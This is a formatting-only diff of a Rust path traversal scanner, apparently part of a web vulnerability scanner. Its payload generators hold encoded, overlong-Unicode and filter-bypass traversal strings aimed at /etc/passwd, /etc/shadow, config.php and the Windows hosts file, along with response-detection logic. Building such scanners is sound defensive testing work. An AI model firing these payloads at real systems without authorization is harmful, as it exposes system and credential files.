@@ -7,8 +7,8 @@ use crate::scanners::registry::PayloadIntensity;
 use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
 use anyhow::Result;
 use futures::stream::{self, StreamExt};
-use std::sync::Arc;
 use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
+use std::sync::Arc;
 use tokio::sync::Mutex;
 use tracing::{debug, info};
 
@@ -68,7 +68,8 @@ impl PathTraversalScanner {
         config: &ScanConfig,
     ) -> Result<(Vec<Vulnerability>, usize)> {
         // Default to Standard intensity if not specified
-        self.scan_parameter_with_intensity(base_url, parameter, config, PayloadIntensity::Standard).await
+        self.scan_parameter_with_intensity(base_url, parameter, config, PayloadIntensity::Standard)
+            .await
     }
 
     /// Scan parameter with specified payload intensity (intelligent mode)
@@ -81,7 +82,10 @@ impl PathTraversalScanner {
     ) -> Result<(Vec<Vulnerability>, usize)> {
         // Smart parameter filtering - path traversal needs file/path parameters
         if ParameterFilter::should_skip_parameter(parameter, ScannerType::PathTraversal) {
-            debug!("[PathTraversal] Skipping non-file/path parameter: {}", parameter);
+            debug!(
+                "[PathTraversal] Skipping non-file/path parameter: {}",
+                parameter
+            );
             return Ok((Vec::new(), 0));
         }
 
@@ -137,16 +141,34 @@ impl PathTraversalScanner {
                     }
 
                     let test_url = if url.contains('?') {
-                        format!("{}&{}={}", url, param, urlencoding::encode(&payload.payload))
+                        format!(
+                            "{}&{}={}",
+                            url,
+                            param,
+                            urlencoding::encode(&payload.payload)
+                        )
                     } else {
-                        format!("{}?{}={}", url, param, urlencoding::encode(&payload.payload))
+                        format!(
+                            "{}?{}={}",
+                            url,
+                            param,
+                            urlencoding::encode(&payload.payload)
+                        )
                     };
 
                     if let Ok(response) = client.get(&test_url).await {
                         tests_completed.fetch_add(1, Ordering::Relaxed);
 
-                        if let Some(vuln) = Self::detect_path_traversal_static(&response.body, &payload, &param, &test_url) {
-                            info!("[ALERT] Path traversal via {} detected", payload.category.as_str());
+                        if let Some(vuln) = Self::detect_path_traversal_static(
+                            &response.body,
+                            &payload,
+                            &param,
+                            &test_url,
+                        ) {
+                            info!(
+                                "[ALERT] Path traversal via {} detected",
+                                payload.category.as_str()
+                            );
                             found_vuln.store(true, Ordering::Relaxed);
                             let mut vulns = vulnerabilities.lock().await;
                             vulns.push(vuln);
@@ -177,7 +199,10 @@ impl PathTraversalScanner {
 
     /// Select diverse payloads across categories up to the limit
     /// This ensures we test different bypass techniques rather than just the first N
-    fn select_diverse_payloads(payloads: Vec<TraversalPayload>, limit: usize) -> Vec<TraversalPayload> {
+    fn select_diverse_payloads(
+        payloads: Vec<TraversalPayload>,
+        limit: usize,
+    ) -> Vec<TraversalPayload> {
         use std::collections::HashMap;
 
         if payloads.len() <= limit {
@@ -185,7 +210,8 @@ impl PathTraversalScanner {
         }
 
         // Group payloads by category
-        let mut by_category: HashMap<TraversalBypassCategory, Vec<TraversalPayload>> = HashMap::new();
+        let mut by_category: HashMap<TraversalBypassCategory, Vec<TraversalPayload>> =
+            HashMap::new();
         for payload in payloads {
             by_category
                 .entry(payload.category.clone())
@@ -278,31 +304,43 @@ impl PathTraversalScanner {
 
         // Triple URL encoded
         let triple_encoded = vec![
-            ("%25252e%25252e%25252f", TraversalBypassCategory::DoubleEncoding),
+            (
+                "%25252e%25252e%25252f",
+                TraversalBypassCategory::DoubleEncoding,
+            ),
             ("..%25252f", TraversalBypassCategory::DoubleEncoding),
         ];
 
         // Unicode/UTF-8 overlong encoding
         let unicode = vec![
-            ("%c0%ae%c0%ae/", TraversalBypassCategory::UnicodeEncoding),  // Overlong ..
-            ("%c0%ae%c0%ae%c0%af", TraversalBypassCategory::UnicodeEncoding),
+            ("%c0%ae%c0%ae/", TraversalBypassCategory::UnicodeEncoding), // Overlong ..
+            (
+                "%c0%ae%c0%ae%c0%af",
+                TraversalBypassCategory::UnicodeEncoding,
+            ),
             ("..%c0%af", TraversalBypassCategory::UnicodeEncoding),
-            ("%e0%80%ae%e0%80%ae/", TraversalBypassCategory::UnicodeEncoding),
+            (
+                "%e0%80%ae%e0%80%ae/",
+                TraversalBypassCategory::UnicodeEncoding,
+            ),
             ("%u002e%u002e/", TraversalBypassCategory::UnicodeEncoding),
-            ("%u002e%u002e%u002f", TraversalBypassCategory::UnicodeEncoding),
+            (
+                "%u002e%u002e%u002f",
+                TraversalBypassCategory::UnicodeEncoding,
+            ),
             ("..%u002f", TraversalBypassCategory::UnicodeEncoding),
-            ("%uff0e%uff0e/", TraversalBypassCategory::UnicodeEncoding),  // Fullwidth
-            ("。。/", TraversalBypassCategory::UnicodeEncoding),  // Fullwidth dots
-            ("..／", TraversalBypassCategory::UnicodeEncoding),  // Fullwidth slash
+            ("%uff0e%uff0e/", TraversalBypassCategory::UnicodeEncoding), // Fullwidth
+            ("。。/", TraversalBypassCategory::UnicodeEncoding),         // Fullwidth dots
+            ("..／", TraversalBypassCategory::UnicodeEncoding),          // Fullwidth slash
         ];
 
         // Filter bypass patterns
         let filter_bypass = vec![
-            ("....//", TraversalBypassCategory::FilterBypass),  // Strip ../ leaves ../
+            ("....//", TraversalBypassCategory::FilterBypass), // Strip ../ leaves ../
             ("....\\\\", TraversalBypassCategory::FilterBypass),
             ("..../", TraversalBypassCategory::FilterBypass),
             ("....\\", TraversalBypassCategory::FilterBypass),
-            ("..;/", TraversalBypassCategory::FilterBypass),  // Tomcat bypass
+            ("..;/", TraversalBypassCategory::FilterBypass), // Tomcat bypass
             (".../", TraversalBypassCategory::FilterBypass),
             ("...\\", TraversalBypassCategory::FilterBypass),
             ("..././", TraversalBypassCategory::FilterBypass),
@@ -450,8 +488,13 @@ impl PathTraversalScanner {
 
         // Single URL encode - full path
         payloads.push(TraversalPayload {
-            payload: format!("%2e%2e%2f%2e%2e%2f%2e%2e%2f{}",
-                target_file.chars().map(|c| format!("%{:02x}", c as u8)).collect::<String>()),
+            payload: format!(
+                "%2e%2e%2f%2e%2e%2f%2e%2e%2f{}",
+                target_file
+                    .chars()
+                    .map(|c| format!("%{:02x}", c as u8))
+                    .collect::<String>()
+            ),
             category: TraversalBypassCategory::UrlEncoding,
             target_file: target_file.to_string(),
         });
@@ -472,8 +515,10 @@ impl PathTraversalScanner {
 
         // Double URL encode
         payloads.push(TraversalPayload {
-            payload: format!("..%252f..%252f..%252f{}%252f",
-                target_file.split('/').collect::<Vec<_>>().join("%252f")),
+            payload: format!(
+                "..%252f..%252f..%252f{}%252f",
+                target_file.split('/').collect::<Vec<_>>().join("%252f")
+            ),
             category: TraversalBypassCategory::DoubleEncoding,
             target_file: target_file.to_string(),
         });
@@ -566,8 +611,14 @@ impl PathTraversalScanner {
 
             // Mixed slashes
             payloads.push(TraversalPayload {
-                payload: format!("../../../{}\\system32/drivers\\etc\\hosts",
-                    if target.contains("windows") { "windows" } else { "winnt" }),
+                payload: format!(
+                    "../../../{}\\system32/drivers\\etc\\hosts",
+                    if target.contains("windows") {
+                        "windows"
+                    } else {
+                        "winnt"
+                    }
+                ),
                 category: TraversalBypassCategory::WindowsSpecific,
                 target_file: "windows/system32/drivers/etc/hosts".to_string(),
             });
@@ -616,7 +667,10 @@ impl PathTraversalScanner {
         let targets = vec![
             ("../../../../etc/passwd", "etc/passwd"),
             ("../../../../etc/shadow", "etc/shadow"),
-            ("../../../../var/www/html/config.php", "var/www/html/config.php"),
+            (
+                "../../../../var/www/html/config.php",
+                "var/www/html/config.php",
+            ),
         ];
 
         for (path, target) in &targets {
@@ -668,7 +722,10 @@ impl PathTraversalScanner {
 
         // Dot segments - ....// gets normalized to ../ after filter removal
         payloads.push(TraversalPayload {
-            payload: format!("....//....//....//....//....//....//....//....//....//....//....//.....//{}", target),
+            payload: format!(
+                "....//....//....//....//....//....//....//....//....//....//....//.....//{}",
+                target
+            ),
             category: TraversalBypassCategory::FilterBypass,
             target_file: target.to_string(),
         });
@@ -682,14 +739,20 @@ impl PathTraversalScanner {
 
         // Overlong traversal sequences
         payloads.push(TraversalPayload {
-            payload: format!("..././..././..././..././..././..././..././..././..././..././..././..././{}", target),
+            payload: format!(
+                "..././..././..././..././..././..././..././..././..././..././..././..././{}",
+                target
+            ),
             category: TraversalBypassCategory::FilterBypass,
             target_file: target.to_string(),
         });
 
         // Backslash normalization bypass
         payloads.push(TraversalPayload {
-            payload: format!("..\\..\\..\\/..\\..\\..\\/..\\..\\..\\/..\\..\\..\\/{}", target),
+            payload: format!(
+                "..\\..\\..\\/..\\..\\..\\/..\\..\\..\\/..\\..\\..\\/{}",
+                target
+            ),
             category: TraversalBypassCategory::FilterBypass,
             target_file: target.to_string(),
         });
@@ -710,7 +773,9 @@ impl PathTraversalScanner {
 
         // Mixed overlong sequences
         payloads.push(TraversalPayload {
-            payload: "%e0%80%ae%e0%80%ae%c0%af%e0%80%ae%e0%80%ae%c0%af%e0%80%ae%e0%80%ae%c0%afetc/passwd".to_string(),
+            payload:
+                "%e0%80%ae%e0%80%ae%c0%af%e0%80%ae%e0%80%ae%c0%af%e0%80%ae%e0%80%ae%c0%afetc/passwd"
+                    .to_string(),
             category: TraversalBypassCategory::UnicodeEncoding,
             target_file: target.to_string(),
         });
@@ -751,7 +816,8 @@ impl PathTraversalScanner {
 
         // Windows-specific advanced
         payloads.push(TraversalPayload {
-            payload: "....\\\\....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts".to_string(),
+            payload: "....\\\\....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts"
+                .to_string(),
             category: TraversalBypassCategory::WindowsSpecific,
             target_file: "windows/system32/drivers/etc/hosts".to_string(),
         });
@@ -958,7 +1024,10 @@ impl PathTraversalScanner {
         payloads.extend(self.generate_null_byte_injection_payloads());
         payloads.extend(self.generate_advanced_path_manipulation());
 
-        info!("[PathTraversal] Generated {} enterprise payloads", payloads.len());
+        info!(
+            "[PathTraversal] Generated {} enterprise payloads",
+            payloads.len()
+        );
         payloads
     }
 
@@ -1022,12 +1091,23 @@ impl PathTraversalScanner {
         ]
     }
 
-    fn detect_path_traversal(&self, body: &str, payload: &TraversalPayload, parameter: &str, test_url: &str) -> Option<Vulnerability> {
+    fn detect_path_traversal(
+        &self,
+        body: &str,
+        payload: &TraversalPayload,
+        parameter: &str,
+        test_url: &str,
+    ) -> Option<Vulnerability> {
         Self::detect_path_traversal_static(body, payload, parameter, test_url)
     }
 
     /// Static version for use in async contexts without &self
-    fn detect_path_traversal_static(body: &str, payload: &TraversalPayload, parameter: &str, test_url: &str) -> Option<Vulnerability> {
+    fn detect_path_traversal_static(
+        body: &str,
+        payload: &TraversalPayload,
+        parameter: &str,
+        test_url: &str,
+    ) -> Option<Vulnerability> {
         let body_lower = body.to_lowercase();
 
         // Linux indicators
@@ -1095,10 +1175,15 @@ impl PathTraversalScanner {
                 }
 
                 // Skip HTML/JS content - hosts file is plain text
-                if trimmed.contains('<') || trimmed.contains('>') ||
-                   trimmed.contains('{') || trimmed.contains('}') ||
-                   trimmed.contains('(') || trimmed.contains(')') ||
-                   trimmed.contains(';') || trimmed.contains(',') {
+                if trimmed.contains('<')
+                    || trimmed.contains('>')
+                    || trimmed.contains('{')
+                    || trimmed.contains('}')
+                    || trimmed.contains('(')
+                    || trimmed.contains(')')
+                    || trimmed.contains(';')
+                    || trimmed.contains(',')
+                {
                     continue;
                 }
 
@@ -1108,19 +1193,24 @@ impl PathTraversalScanner {
                     let potential_hostname = parts[1];
 
                     // Validate as proper IPv4 (X.X.X.X format)
-                    let is_ipv4 = potential_ip.split('.')
+                    let is_ipv4 = potential_ip
+                        .split('.')
                         .filter_map(|p| p.parse::<u8>().ok())
-                        .count() == 4;
+                        .count()
+                        == 4;
 
                     // Validate as proper IPv6 (contains : and looks like IPv6)
-                    let is_ipv6 = potential_ip.contains(':') &&
-                        potential_ip.chars().all(|c| c.is_ascii_hexdigit() || c == ':') &&
-                        potential_ip.len() >= 2;
+                    let is_ipv6 = potential_ip.contains(':')
+                        && potential_ip
+                            .chars()
+                            .all(|c| c.is_ascii_hexdigit() || c == ':')
+                        && potential_ip.len() >= 2;
 
                     // Hostname must look like a hostname (alphanumeric, dots, hyphens only)
-                    let valid_hostname = potential_hostname.chars()
-                        .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-') &&
-                        potential_hostname.len() >= 1;
+                    let valid_hostname = potential_hostname
+                        .chars()
+                        .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-')
+                        && potential_hostname.len() >= 1;
 
                     if (is_ipv4 || is_ipv6) && valid_hostname {
                         hosts_format_lines += 1;
@@ -1134,57 +1224,127 @@ impl PathTraversalScanner {
             // Only flag if we found MULTIPLE hosts file format lines
             // A single "127.0.0.1 localhost" could be coincidental
             if hosts_format_lines >= 2 {
-                return Some(Self::create_vulnerability_static(parameter, &payload.payload, test_url,
+                return Some(Self::create_vulnerability_static(
+                    parameter,
+                    &payload.payload,
+                    test_url,
                     &format!("Hosts file content found via {}", payload.category.as_str()),
                     Confidence::High,
-                    format!("Found {} hosts file format lines. Example: {}",
-                        hosts_format_lines, evidence_line.unwrap_or_default()),
-                    &payload.category));
+                    format!(
+                        "Found {} hosts file format lines. Example: {}",
+                        hosts_format_lines,
+                        evidence_line.unwrap_or_default()
+                    ),
+                    &payload.category,
+                ));
             }
         }
 
         for (indicator, file_type) in &linux_indicators {
             if body_lower.contains(indicator) {
-                return Some(Self::create_vulnerability_static(parameter, &payload.payload, test_url,
-                    &format!("{} content found via {}", file_type, payload.category.as_str()),
-                    Confidence::High, format!("Indicator: {}", indicator), &payload.category));
+                return Some(Self::create_vulnerability_static(
+                    parameter,
+                    &payload.payload,
+                    test_url,
+                    &format!(
+                        "{} content found via {}",
+                        file_type,
+                        payload.category.as_str()
+                    ),
+                    Confidence::High,
+                    format!("Indicator: {}", indicator),
+                    &payload.category,
+                ));
             }
         }
 
         for (indicator, file_type) in &windows_indicators {
             if body_lower.contains(indicator) {
-                return Some(Self::create_vulnerability_static(parameter, &payload.payload, test_url,
-                    &format!("{} content found via {}", file_type, payload.category.as_str()),
-                    Confidence::High, format!("Indicator: {}", indicator), &payload.category));
+                return Some(Self::create_vulnerability_static(
+                    parameter,
+                    &payload.payload,
+                    test_url,
+                    &format!(
+                        "{} content found via {}",
+                        file_type,
+                        payload.category.as_str()
+                    ),
+                    Confidence::High,
+                    format!("Indicator: {}", indicator),
+                    &payload.category,
+                ));
             }
         }
 
         for (indicator, file_type) in &proc_indicators {
             if body_lower.contains(indicator) {
-                return Some(Self::create_vulnerability_static(parameter, &payload.payload, test_url,
-                    &format!("{} content found via {}", file_type, payload.category.as_str()),
-                    Confidence::High, format!("Indicator: {}", indicator), &payload.category));
+                return Some(Self::create_vulnerability_static(
+                    parameter,
+                    &payload.payload,
+                    test_url,
+                    &format!(
+                        "{} content found via {}",
+                        file_type,
+                        payload.category.as_str()
+                    ),
+                    Confidence::High,
+                    format!("Indicator: {}", indicator),
+                    &payload.category,
+                ));
             }
         }
 
         for (indicator, file_type) in &config_indicators {
             if body_lower.contains(indicator) {
-                return Some(Self::create_vulnerability_static(parameter, &payload.payload, test_url,
-                    &format!("{} content found via {}", file_type, payload.category.as_str()),
-                    Confidence::High, format!("Indicator: {}", indicator), &payload.category));
+                return Some(Self::create_vulnerability_static(
+                    parameter,
+                    &payload.payload,
+                    test_url,
+                    &format!(
+                        "{} content found via {}",
+                        file_type,
+                        payload.category.as_str()
+                    ),
+                    Confidence::High,
+                    format!("Indicator: {}", indicator),
+                    &payload.category,
+                ));
             }
         }
 
         None
     }
 
-    fn create_vulnerability(&self, parameter: &str, payload: &str, test_url: &str,
-        description: &str, confidence: Confidence, evidence: String, category: &TraversalBypassCategory) -> Vulnerability {
-        Self::create_vulnerability_static(parameter, payload, test_url, description, confidence, evidence, category)
+    fn create_vulnerability(
+        &self,
+        parameter: &str,
+        payload: &str,
+        test_url: &str,
+        description: &str,
+        confidence: Confidence,
+        evidence: String,
+        category: &TraversalBypassCategory,
+    ) -> Vulnerability {
+        Self::create_vulnerability_static(
+            parameter,
+            payload,
+            test_url,
+            description,
+            confidence,
+            evidence,
+            category,
+        )
     }
 
-    fn create_vulnerability_static(parameter: &str, payload: &str, test_url: &str,
-        description: &str, confidence: Confidence, evidence: String, category: &TraversalBypassCategory) -> Vulnerability {
+    fn create_vulnerability_static(
+        parameter: &str,
+        payload: &str,
+        test_url: &str,
+        description: &str,
+        confidence: Confidence,
+        evidence: String,
+        category: &TraversalBypassCategory,
+    ) -> Vulnerability {
         Vulnerability {
             id: format!("lfi_{:x}", rand::random::<u32>()),
             vuln_type: format!("Path Traversal ({})", category.as_str()),
